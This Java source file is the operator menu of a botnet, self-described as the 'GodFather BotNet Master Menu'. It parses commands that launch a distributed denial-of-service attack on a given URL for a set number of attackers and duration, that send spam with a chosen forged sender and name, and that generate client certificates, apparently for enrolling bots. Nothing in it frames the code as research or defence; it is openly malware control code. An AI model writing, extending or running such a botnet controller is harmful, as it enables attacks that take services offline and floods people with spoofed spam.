package godfather.menu;

import godfather.Godfather;
import godfather.PeerType;

import java.util.Scanner;

import org.apache.log4j.Logger;



public class MasterUI {
    static Logger logger = Logger.getLogger(MasterUI.class);

    private final Godfather godfather;
    boolean running = true;
    PeerType type;


    public MasterUI(Godfather app, PeerType type) {
        this.godfather = app;
        this.type = type;
        logger.info("Type help for Menu");
    }


    public void start() {
        logger.info("\n Write help to show the list of Commands \n");
        logger.info("\n " + type + " MODE \n");
        String input = null;
        while (running) {
            // reads from user input if no commands loaded
            input = getUserInput();
            selectMenu(input);
        }
    }


    /**
     * Selects the comand selected by the User
     */
    private void selectMenu(String input) {
        String[] parsed = input.split(" ");

        try {
            if (parsed.length > 0) {
                if (parsed[0].length() == 0) {
                    return;
                }
                MenuOption opt = MenuOption.valueOf(parsed[0]);
                switch (opt) {
                case exit:
                    running = false;
                    break;
                case help:
                    showCommandList();
                    break;
                case ddos:
                    if (parsed.length < 4) {
                        logger.info("ddos <URL> <numberOfThreads> <howLong(ms)> [<argument> <value>]");
                        break;
                    }
                    try {
                        DDOS(parsed);
                    } catch (Exception e) {
                        logger.info("ddos not send because: " + e.getMessage());
                    }
                    break;

                case spam:
                    input = input.replace("spam ", "");
                    String[] spammParse = input.split("#");
                    if (spammParse.length < 5) {
                        logger.info("spam <destination>#<source>#<sourceFullName>#<subject>#<message>");
                        break;
                    }
                    try {
                        godfather.sendSpam(spammParse[0], spammParse[1], spammParse[2], spammParse[3], spammParse[4]);
                    } catch (Exception e) {
                        logger.info("Error sending spam");
                    }
                    break;
                case new_cert:
                    if (parsed.length < 2) {
                        logger.info("new_cert <client name>");
                        break;
                    }
                    generateClientCertificate(parsed[1]);
                    break;
                default:
                    logger.info("Command do not exists");
                    break;
                }
            }
        } catch (ArrayIndexOutOfBoundsException e) {
            logger.info("Invalid Command");
        } catch (StringIndexOutOfBoundsException e) {
            logger.info("Invalid Command");
        } catch (IllegalArgumentException e) {
            logger.info("Invalid Command");
        }

    }

    private void showCommandList() {
        logger.info("\n GodFather BotNet Master Menu:\n");
        logger.info("spam|<destination>|<source>|<sourceFullName>|<subject>|<message>");
        logger.info("ddos <URL> <numberOfAttackers> <howLong(ms)> [<argument> <value>] ");
        logger.info("new_cert <client name>");
    }


    /**
     * Method used to get User Input
     */
    private String getUserInput() {
        @SuppressWarnings("resource")
        Scanner scan = new Scanner(System.in);
        String userInput = scan.nextLine();
        return userInput;
    }





    private void DDOS(String[] userInput) throws Exception {
        String targetURL = userInput[1];
        int numberOfAttackers = Integer.parseInt(userInput[2]);
        long duration = Long.parseLong(userInput[3]);
        godfather.sendDDoS(targetURL, numberOfAttackers, duration);
    }



    private void generateClientCertificate(String clientName) {
        try {
            godfather.createClientCertificate(clientName);
            logger.info("generated. Check: security/clients/" + clientName);
            logger.info("If you want use the client, move the files to security/ dir");
        } catch (Exception e) {
            logger.info("Could not gen Client Certificate: " + e.getMessage());
        }
    }
}
